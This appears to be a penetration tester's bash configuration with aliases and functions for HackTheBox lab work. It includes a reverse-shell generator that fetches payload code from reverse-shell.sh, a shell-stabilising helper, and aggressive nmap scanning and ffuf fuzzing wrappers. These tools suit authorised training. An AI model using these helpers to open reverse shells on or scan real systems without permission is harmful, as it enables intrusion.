
# list files with additional information
alias ll='ls -alhF'

# copy command output directly to clipboard
alias c='xclip -selection clipboard'

# start http server: server <PORT> <DIR>
server() {
        if [[ $2 ]];then
                python3 -m http.server $1 --directory $2
        else
                python3 -m http.server $1
        fi
}

# generate reverse shell: rs <IP> <PORT> > <FILENAME>
rs() {
        curl https://reverse-shell.sh/$1:$2
}

con-htb() {
        sudo openvpn /home/yatesh/export/yakate.ovpn
}

htb-init() {
        if [[ $1 ]]; then
                mkdir -p /home/y/Documents/HTB/Machines/$1/files
                mkdir -p /home/y/Documents/HTB/Machines/$1/exploits
                mkdir -p /home/y/Documents/HTB/Machines/$1/share
                cd /home/y/Documents/HTB/Machines/$1/share
                /usr/bin/python3 -m http.server 8080 > /dev/null 2>&1 &
                echo $! > /home/y/Documents/HTB/Machines/$1/.server.pid
                cd /home/y/Documents/HTB/$1
                clear
        else
                echo 'Usage: htb-init Moderators'
        fi
}


# Usage: nmap-full 10.10.11.169
nmap-full() {
        nmap -p- -sC -sV -A --min-rate=400 --min-parallelism=512 -vv $1 -oA $1_nmap
}

# add ip/domain to /etc/hosts. Usage: addhost <IP> <DOMAIN>
addhost() {
    if [ "$#" -ne 2 ]; then
      echo "[i] Usage: addhost <ip> <hostname>"
      return 1
    fi

    ip="$1"
    hostname="$2"
    if grep -q "^$ip" /etc/hosts; then
      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
    else
      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
    fi

    grep "^$ip" /etc/hosts
}

# NMAP UDP ONLY
nmap_udp () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_udp ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sUCV -T4 --min-rate 10000 "${@}" -v -oA nmap/udp_default
  fi
}

# Usage: ffuf-dir http://site.com/FUZZ
ffuf-dir() {
        ffuf -u $1 -w /usr/share/wordlists/dirb/big.txt ${@: 2};
}

# Usage: ffuf-vhost domain.local
ffuf-vhost() {
        ffuf -H "Host: FUZZ.$1" -u http://$1 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt ${@: 2};
}


# Stabilize shell
st() {
    if [[ $1 -eq 1 ]]; then
        printf "python -c 'import pty;pty.spawn(\"/bin/bash\")'\n"|c

    elif [[ $1 -eq 2 ]]; then
        printf "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"|c
    else
        printf 'script -q /dev/null -c /bin/bash\n'|c
    fi
    echo "Stablizing commands copied to the clipboard!!"
    stty raw -echo;fg
    export TERM=tmux-256color
}


# create folder and cd into it
mcd() {
  mkdir $1 && cd $_
}


# go back several directories by stating the dir name or the amount of dirs to go back
# Usage: cdb <dirname>  or cdb .. 2
cdb() {
    local target_dir="$1"
    local depth="${2:-1}"

    # Traverse up the directory tree to the specified depth
    local current_dir=$(pwd)
    for ((i=0; i<$depth; i++)); do
        current_dir=$(dirname "$current_dir")
    done

    # Find the target directory at or above the specified depth
    local result=$(find "$current_dir" -maxdepth 1 -type d -name "$target_dir" 2>/dev/null | head -n 1)

    if [ -n "$result" ]; then
        cd "$result" || echo "Failed to change to directory: $result"
    else
        echo "Directory '$target_dir' not found within $depth levels up"
    fi
}

